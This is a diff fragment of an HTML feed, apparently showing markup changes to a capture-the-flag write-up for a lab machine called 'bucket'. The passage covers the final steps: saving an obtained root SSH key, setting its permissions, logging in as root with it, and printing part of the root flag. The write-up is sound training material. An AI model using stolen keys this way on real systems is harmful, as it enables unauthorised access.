-</span></span></code></pre></div><p>The full process as shown below:</p>
+</span></span><span class="line"><span class="cl">-----END OPENSSH PRIVATE KEY-----</span></span></code></pre>
+</figure><p>The full process as shown below:</p>
 <p><div class="img-container"><img src="imgs/image-20210425032310617.png" alt="image-20210425032310617"  /></div>
 </p>
 <p>I’ll save that key as <code>root_rsa</code> and change its permission to 600.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «bucket» «10.10.14.39» 
-</span></span><span class="line"><span class="cl">$ chmod <span class="m">600</span> root_rsa
-</span></span></code></pre></div><p>After that, I can just login as root user using the SSH key I obtained.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «bucket» «10.10.14.39» 
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «bucket» «10.10.14.39» 
+</span></span><span class="line"><span class="cl">$ chmod <span class="m">600</span> root_rsa</span></span></code></pre>
+</figure><p>After that, I can just login as root user using the SSH key I obtained.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «bucket» «10.10.14.39» 
 </span></span><span class="line"><span class="cl">$ ssh -i root_rsa 10.10.10.212
 </span></span><span class="line"><span class="cl">Welcome to Ubuntu 20.04 LTS <span class="o">(</span>GNU/Linux 5.4.0-48-generic x86_64<span class="o">)</span>
 </span></span><span class="line"><span class="cl">
@@ -1171,8 +1261,8 @@
 </span></span><span class="line"><span class="cl">root@bucket:~# id<span class="p">;</span>hostname<span class="p">;</span>cut -c-15 root.txt 
 </span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
 </span></span><span class="line"><span class="cl">bucket
-</span></span><span class="line"><span class="cl">efc73dd09ceb705
-</span></span></code></pre></div>]]></content:encoded>
+</span></span><span class="line"><span class="cl">efc73dd09ceb705</span></span></code></pre>
+</figure>]]></content:encoded>
     </item>
     
   </channel>
